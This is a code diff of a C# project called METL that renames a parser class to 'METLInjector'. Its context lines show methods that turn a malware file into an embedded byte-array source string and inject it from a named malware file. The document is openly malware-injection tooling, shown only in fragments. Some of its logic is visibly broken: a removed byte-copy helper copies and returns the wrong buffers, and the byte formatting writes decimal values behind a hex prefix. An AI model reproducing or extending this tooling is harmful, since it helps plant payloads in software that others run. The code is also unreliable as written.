@@ -10,37 +10,8 @@ using Microsoft.Extensions.DependencyModel;
 
 namespace METL
 {
-    public class METLParser
+    public class METLInjector
     {
-        public static byte[] AppendBytesFromFile([NotNull]byte[] source, string embedFileName)
-        {
-            if (string.IsNullOrEmpty(embedFileName))
-            {
-                throw new ArgumentNullException(nameof(embedFileName));
-            }
-
-            if (!File.Exists(embedFileName))
-            {
-                throw new FileNotFoundException(embedFileName);
-            }
-
-            var embedBytes = File.ReadAllBytes(embedFileName);
-
-            return AppendBytesFromBytes(source, embedBytes);
-        }
-
-        public static byte[] AppendBytesFromBytes([NotNull]byte[] source, [NotNull]byte[] embedBytes)
-        {
-            if (source == null)
-            {
-                throw new ArgumentNullException(nameof(source));
-            }
-
-            System.Buffer.BlockCopy(embedBytes, 0, source, 0, source.Length);
-  
-            return embedBytes;
-        }
-
         private static string GenerateCodeFromBytes(byte[] fileBytes)
         {
             var malwareSourceCode = "byte[] malSource = {";
@@ -51,7 +22,7 @@ namespace METL
             {
                 array.Add($"0x{fileByte}");
             }
-            
+
             return malwareSourceCode + string.Join(",", array) + "};";
         }
 
@@ -100,11 +71,11 @@ namespace METL
             {
                 Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
             }
-        
+
             return null;
         }
 
-        public static byte[] InjectMalwareFromFile([NotNull]string sourceFileName, [NotNull]string malwareFileName)
+        public static byte[] InjectMalwareFromFile([NotNull] string sourceFileName, [NotNull] string malwareFileName)
         {
             if (string.IsNullOrEmpty(sourceFileName))
             {
